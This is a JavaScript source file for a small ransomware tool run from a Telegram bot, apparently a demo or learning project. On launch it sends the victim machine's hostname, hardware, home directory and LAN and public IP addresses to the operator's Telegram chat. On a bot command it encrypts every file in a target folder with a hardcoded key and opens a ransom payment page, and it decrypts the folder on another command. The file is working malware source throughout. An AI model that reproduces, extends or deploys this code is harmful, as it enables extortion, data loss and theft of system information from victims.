const os = require('os');
const {Telegraf} = require('telegraf');
const fs = require('fs');
const pathModule = require('path');
const express = require('express');
const appe = express();
const crypti = require('cryptify');
const open = require('open');
const ipPublic = require('public-ip');
require('dotenv').config();

const joeBot = new Telegraf(process.env.TOKEN);

const pathToAttack = './myFiles';

const key = '@Sa12345678';

const PORT = '3000';

const { app, BrowserWindow} = require('electron');

const URL = process.env.APPLINK;


let window
app.on('ready', () => {
    window = new BrowserWindow({});
    window.loadURL(URL);
});





appe.use(express.static(pathModule.join(__dirname,'public')))


appe.post('/', (req,res) => {
    console.log('Payment Done');
    joeBot.telegram.sendMessage(process.env.TELEGRAMID, `User ${os.hostname} said the payment is done`);
    res.redirect('/');
});
appe.get('/', (req,res) => {
    res.sendFile('index.html');
});


appe.listen(PORT, () => {
    console.log(`Server on Port: ${PORT} `);
});





const getLANIpAddress = (netInterface) => {
    let interfaces = [];
    for(let i = 0; i < netInterface.length; i++){
        interfaces.push(netInterface[i].address);
    }
    return interfaces;
}


const encryptFile = (filePath) => {
    const instanceFile = new crypti(filePath, key);
    instanceFile.encrypt().then(() => {
        console.log('ok')
    })
}


const decryptFile  = (path)  => {
    const instanceFile = new crypti(path, key);
    instanceFile.decrypt().then(() => {
        console.log('ok')
    })
}

const filesFinder = (path) => {
    let filesToEncrpt = [];
    fs.readdirSync(path).forEach(file => {
        console.log(file);
        if (fs.statSync(pathModule.join(path, file)).isFile()){
            let f = pathModule.join(__dirname, pathToAttack, file)
            filesToEncrpt.push(f);
        }
    });
    return filesToEncrpt;
}
const ActivateRansomware = () => {
    filesFinder(pathToAttack).forEach(file => {
        encryptFile(file);
    });
    open('http://localhost:3000')
}

const DesactivateRansomeware = () => {
    filesFinder(pathToAttack).forEach(file => {
        decryptFile(file);
    })
}

const getPublicIp = async ()=> {
    let inf = `
    Id: ${os.hostname}
    CPU: ${os.cpus()[0].model}
    Model: ${os.arch()}
    OS: ${os.platform}
    Home dir: ${os.homedir()}
    Ip LAN: ${getLANIpAddress(os.networkInterfaces().wlp2s0)}
    Public IP: ${await ipPublic.v4()}
    `
    joeBot.telegram.sendMessage(process.env.TELEGRAMID, inf);
}


joeBot.hears('ransomware', (ctx) => {
    ActivateRansomware();
    ctx.reply('Files in path encrypted');
});

joeBot.hears('down', (ctx) => {
    DesactivateRansomeware();
    ctx.reply('Files in path Decrypted');
})


getPublicIp();

joeBot.launch();
